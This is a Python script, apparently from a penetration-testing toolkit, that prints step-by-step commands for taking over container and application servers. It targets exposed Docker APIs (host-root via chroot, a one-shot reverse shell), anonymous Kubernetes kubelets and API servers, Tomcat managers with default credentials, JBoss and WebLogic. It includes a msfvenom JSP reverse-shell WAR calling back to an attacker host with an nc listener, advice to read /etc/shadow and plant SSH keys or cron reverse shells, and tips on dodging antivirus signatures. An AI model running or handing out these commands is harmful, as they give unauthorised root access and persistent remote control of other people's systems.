#!/usr/bin/env python3
"""CONTAINER / APP-SERVER foothold — exposed Docker API, Kubernetes, Tomcat/JBoss/WebLogic managers.
PRINTS commands. Edit LHOST in _services_common.py.

Usage:
  python3 gen_container.py docker  --target 10.0.0.5           # exposed Docker API 2375 -> root on host
  python3 gen_container.py k8s     --target 10.0.0.5           # anonymous kubelet/API -> pod/node
  python3 gen_container.py tomcat  --target 10.0.0.5 [--port 8080] [--user tomcat --pass tomcat]  # manager -> WAR
  python3 gen_container.py jboss|weblogic --target 10.0.0.5
"""
import sys
import _services_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg  = sys.argv[1] if len(sys.argv) > 1 else "docker"
t    = opt("--target", "<target>")
port = opt("--port", "8080")
u    = opt("--user", "tomcat"); pw = opt("--pass", "tomcat")

if arg == "docker":
    print(f"# EXPOSED DOCKER API (2375 plain / 2376 TLS) — instant root on the host:")
    print(f"# needs: the Docker API reachable + unauthenticated on 2375 (plain).")
    print(f"docker -H tcp://{t}:2375 version    # confirm reachable")
    print(f"#   -> ok: `docker ... version` returns the Server version block = the API is open and unauthenticated")
    print(f"docker -H tcp://{t}:2375 ps -a")
    print(f"# mount the host filesystem into a container and chroot -> root on the HOST:")
    print(f"# order: interactive chroot first; use the one-shot below only when you have no TTY.")
    print(f"docker -H tcp://{t}:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh")
    print(f"#   -> ok: you get a `#` shell and `ls /mnt/etc` shows the HOST's files = root on the host")
    print(f"#   then in that shell: add a user / read /etc/shadow / drop an SSH key / cron a revshell.")
    print(f"# no interactive? one-shot:  docker -H tcp://{t}:2375 run -v /:/mnt alpine chroot /mnt sh -c '{P.revshell_nq()}'")

elif arg == "k8s":
    print(f"# KUBERNETES footholds:")
    print(f"# needs: an anonymous-enabled component — kubelet (10250) OR API server (6443/8443/8080) OR a token from inside a pod.")
    print(f"# order: kubelet (1) is the most common anonymous win; then the API server (2); (3) is post-foothold from a pod.")
    print(f"# 1) anonymous kubelet (10250) — list + exec into pods:")
    print(f"curl -sk https://{t}:10250/pods | jq '.items[].metadata | .namespace,.name'")
    print(f"#   -> ok: namespace/pod name pairs print (not '401') = the kubelet answers anonymously")
    print(f"curl -sk https://{t}:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'   # exec in a pod")
    print(f"#   -> ok: the `id` output returns = you can exec in that pod")
    print(f"# 2) anonymous API server (6443/8443/8080):")
    print(f"kubectl --insecure-skip-tls-verify -s https://{t}:6443 get pods -A   # if anonymous-auth is on")
    print(f"#   -> ok: a pod list prints (not 'Unauthorized') = anonymous API access")
    print(f"# 3) from a pod: check the service-account token (/var/run/secrets/...) + look for cluster-admin RBAC.")
    print(f"# -> exec into a privileged/hostPath pod -> node root; or create one if RBAC allows.")

elif arg == "tomcat":
    print(f"# TOMCAT MANAGER ({port}) — default creds -> deploy a WAR webshell:")
    print(f"# needs: the Manager app reachable at /manager AND working creds in <user>:<pass> (default guesses below).")
    print(f"# 1) try defaults at /manager/html (tomcat:tomcat, admin:admin, tomcat:s3cret, ../network/gen_spray http-get):")
    print(f"curl -su {u}:{pw} http://{t}:{port}/manager/text/list")
    print(f"#   -> ok: an 'OK - Listed applications' line (not 401/403) = the creds work on the Manager")
    print(f"# 2) build a JSP-shell WAR + deploy:")
    print(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={P.LHOST} LPORT={P.LPORT} -f war -o s.war   # (AV-signatured; or a manual JSP WAR)")
    print(f"curl -su {u}:{pw} -T s.war 'http://{t}:{port}/manager/text/deploy?path=/s'")
    print(f"#   -> ok: 'OK - Deployed application at context path /s' = the WAR deployed")
    print(f"curl http://{t}:{port}/s/     # triggers it   catch: nc -lvnp {P.LPORT}")
    print(f"#   -> ok: a connection hits your listener = the JSP shell fired")
    print(f"# undeploy after:  curl -su {u}:{pw} 'http://{t}:{port}/manager/text/undeploy?path=/s'  (artifact cleanup)")

elif arg == "jboss":
    print(f"# JBoss ({port}) — jmx-console / web-console / DeploymentFileRepository -> deploy a WAR:")
    print(f"# needs: an exposed JBoss console (/jmx-console or /web-console) reachable with default/no creds.")
    print(f"# check /jmx-console /web-console/  (default/no creds). Tool: jexboss -host http://{t}:{port}")
    print(f"jexboss -host http://{t}:{port}     # auto-detects + deploys a shell")
    print(f"#   -> ok: jexboss reports a vulnerable vector and drops you a shell prompt")

elif arg == "weblogic":
    print(f"# WebLogic ({port}) — console deploy (weblogic:weblogic) OR a deserialization CVE:")
    print(f"# needs: either the admin console with working creds, OR a version vulnerable to one of the unauth CVEs.")
    print(f"# order: try the console + default creds first (simplest); fall back to an unauth CVE if that fails.")
    print(f"# console:  /console  default creds -> deploy a WAR.")
    print(f"# unauth RCE CVEs: CVE-2019-2725 / CVE-2020-14882 (+14883) / CVE-2023-21839 -> searchsploit weblogic / msf.")
else:
    print("use: docker | k8s | tomcat | jboss | weblogic"); sys.exit(1)

print(f"\n# a shell -> ../../winpriv/enum.bat or ../../linpriv/enum.sh.  NOTE: deployed WARs / created containers are")
print(f"#   ARTIFACTS to remove (report --cleanup). msfvenom WARs are AV-signatured — prefer a hand-written JSP.")
